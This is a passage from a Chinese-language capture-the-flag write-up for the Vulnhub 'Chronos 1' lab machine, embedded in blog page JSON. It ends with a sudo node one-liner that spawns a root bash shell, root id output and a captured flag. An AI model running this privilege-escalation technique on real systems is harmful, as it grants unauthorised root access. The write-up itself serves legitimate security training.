/usr/local/<span class=\"hljs-built_in\">bin</span>/node *\n</code></pre>\n</li>\n<li>\n<p>可以进行提权了</p>\n<blockquote>\n<p><a href=\"https://www.huangmj.com/17116743651246.html#41-sudo-node\">https://www.huangmj.com/17116743651246.html#41-sudo-node</a></p>\n</blockquote>\n<pre><code class=\"hljs language-python\">imera@chronos:~$ sudo node -e <span class=\"hljs-string\">\"require('child_process').spawn('/bin/bash',{stdio:[0,1,2]})\"</span>\n<span class=\"hljs-built_in\">id</span>\nuid=<span class=\"hljs-number\">0</span>(root) gid=<span class=\"hljs-number\">0</span>(root) groups=<span class=\"hljs-number\">0</span>(root)\n</code></pre>\n<p>获得root！！！！</p>\n</li>\n<li>\n<p>读取<code>flag</code> 文件</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># user.txt</span>\nbyBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK\n</code></pre>\n</li>\n</ol>\n<h2>总结</h2>\n<p>难点在提权到<code>imera</code>用户，以及发现<code>web</code>突破点的思路，还得学习Node.js的原型链污染（我还没学），最后的提权到<code>root</code>也是之前没有尝试过的</p>","title":"Vulnhub - Chronos 1","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"Chronos: 1\n\n https://www.vulnhub.com/entry/chronos-1,735/\n \n\nps：该靶机需要在hosts文件添加`chronos.local`记录，在官方地址上没有写\n\n主机发现端口扫描\n\n1. 使用nmap扫描网段类存活主机\n    \n    因为靶机是我最后添加的，所以靶机IP是`7` ，`kali`是`10`\n    \n    \n    \n2. ..."},"recentPosts":[{"id":"TheHackersLabsCyberGuard","title":"TheHackersLabs - CyberGuard","date":"2025-07-28","isEncrypted":false,"year":"2025","month":"07","day":"28"},{"id":"TheHackersLabsPacharán","title":"TheHackersLabs - Pacharán","date":"2025-07-27","isEncrypted":false,"year":"2025","month":"07","day":"27"},{"id":"TheHackersLabsBack To The Future I","title":"TheHackersLabs - Back To The Future I","date":"2025-07-26","isEncrypted":false,"year":"2025","month":"07","day":"26"},{"id":"TheHackersLabsNodeCeption","title":"TheHackersLabs - NodeCeption","date":"2025-07-25","isEncrypted":false,"year":"2025","month":"07","day":"25"},{"id":"TheHackersLabsPildoritas","title":"TheHackersLabs - Pildoritas","date":"2025-07-24","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"HackTheBoxMachine - Scepter","title":"HackTheBox - Machine - Scepter","date":"2025-04-26","isEncrypted":false,"year":"2025","month":"07","day":"24"},{"id":"TheHackersLabsMentallity","title":"TheHackersLabs - Mentallity","date":"2025-07-23","isEncrypted":false,"year":"2025","month":"07","day":"23"}]},"__N_SSG":true}